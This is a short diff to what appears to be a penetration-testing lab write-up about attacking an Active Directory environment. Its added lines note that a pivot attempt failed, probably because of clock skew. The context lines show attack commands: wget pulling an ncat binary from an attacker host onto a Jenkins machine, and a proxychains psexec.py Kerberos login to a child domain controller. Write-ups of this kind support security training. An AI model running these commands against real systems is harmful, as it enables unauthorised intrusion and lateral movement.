@@ -346,6 +346,7 @@ Then on the Jenkin machine, download the served `ncat`:
 ```
 wget http://192.168.100.11/ncat
 ```
+
 ![picture 7](images/adc8f705ccec32b48462b787c4d60278fe99610c5313200d5cbd56b2e653b9a3.png)  
 
 <br/>
@@ -411,4 +412,10 @@ echo "10.1.1.2 OPS-CHILDDC" >> /etc/hosts
 ```
 proxychains psexec.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
 ```
+
+<br/>
+
+However, it is not successful. A possible reason is the time difference of the attacker machine and the target is greater than 15 minutes.
+
+![picture 13](images/618dc3ec3107fc274218c7a51a1a24207f8e7b1f48cef5666e46ba0462c08e96.png)  
 
